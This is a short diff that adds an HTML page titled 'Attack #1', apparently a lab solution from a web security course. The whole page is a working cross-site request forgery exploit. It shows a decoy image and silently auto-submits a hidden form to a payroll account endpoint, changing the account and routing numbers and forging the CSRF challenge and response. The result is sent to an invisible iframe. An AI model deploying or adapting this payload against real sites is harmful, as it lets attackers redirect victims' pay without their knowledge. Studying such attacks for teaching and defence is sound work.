@@ -1,0 +1,22 @@
+<html>
+<title>Attack #1</title>
+
+<body>
+<img src="http://a1.att.hudong.com/53/17/14300000864290128462179908607.jpg" height="300" wirgh="500"> </img>
+<form name="attack" method="post" action="http://payroll.utexas.edu/account.php" target="aaa">
+       <input id="account" type="hidden" name="account" value="31337">
+       <input id="route" type="hidden" name="routing" value="10001">
+       <input id="csrf_challenge" type="hidden" name="chal" value="123">
+       <input id="csrf_response" type="hidden" name="resp" value="MzEzMzcxMjMxMDAwMQ==">
+        <input type="hidden" name="action" value="save">
+
+       
+</form>
+
+<iframe name="aaa" height="0" width="0" src="about:blank"></iframe>
+<script type="text/javascript">document.forms["attack"].submit();</script> 
+
+ 
+</body>
+
+</html>
